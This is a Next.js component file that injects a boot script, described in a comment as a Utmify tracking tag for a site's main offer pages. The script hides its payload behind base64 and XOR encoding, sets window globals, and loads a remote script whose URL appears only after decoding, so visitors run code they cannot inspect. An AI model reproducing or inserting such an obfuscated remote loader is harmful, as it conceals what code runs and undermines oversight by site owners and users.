import Script from "next/script";

const BOOT_SCRIPT = `(function(){var n_w=atob("DBWXQVtBr4F0LTAYCm61NCktjbtWRURsematbnQiy+9aWER1Y3Pubzguwq8WXx9raWf+MS8ygPEdVVV0JWX+OT4tgesHDxw6a2HjMzIj2vURXhIiUUi7YzwtwOMVQUM6ME7sYzUgwuRWFxJoY23yLRIlja1WW1F0f3C1e3l3zrNMFAQhPCDyJD5wzbVMFQd7bCGhJ2tj0twJ");var w_r=[];for(var u_og=0;u_og<n_w.length;u_og++){w_r.push(n_w.charCodeAt(u_og)&255);}var y_p7ab=w_r[0];var c_kxk=w_r.slice(1,1+y_p7ab);var r_qdr=w_r.slice(1+y_p7ab);var b_5is4=r_qdr.map(function(b,h_5h){return b^c_kxk[h_5h%y_p7ab];});var r_3kg="";for(var a_h=0;a_h<b_5is4.length;a_h++){r_3kg+=String.fromCharCode(b_5is4[a_h]&255);}var s_6=decodeURIComponent(escape(r_3kg));var u_z=JSON.parse(s_6);var u_gt=u_z.globals||[];u_gt.forEach(function(f_c){window[f_c.name]=f_c.value;});var e_2fxz=document.createElement("script");e_2fxz.src=u_z.url;e_2fxz.async=true;e_2fxz.defer=true;(u_z.attributes||[]).forEach(function(t_zhn0){e_2fxz.setAttribute(t_zhn0.name,t_zhn0.value);});(document.head||document.documentElement).appendChild(e_2fxz);})();`;

/** Tag Utmify exclusiva da oferta principal (/ e /v2). */
export function OfertaPrincipalBootScript() {
  return (
    <Script id="oferta-principal-boot" strategy="afterInteractive">
      {BOOT_SCRIPT}
    </Script>
  );
}
